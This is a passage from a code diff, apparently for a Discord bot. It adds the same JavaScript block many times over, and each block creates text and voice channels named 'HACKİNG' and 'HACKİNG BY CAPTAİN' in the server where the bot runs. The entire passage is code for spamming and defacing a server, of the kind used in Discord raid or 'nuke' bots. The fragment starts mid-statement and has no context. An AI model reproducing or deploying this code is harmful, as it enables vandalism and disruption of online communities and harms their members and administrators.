+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
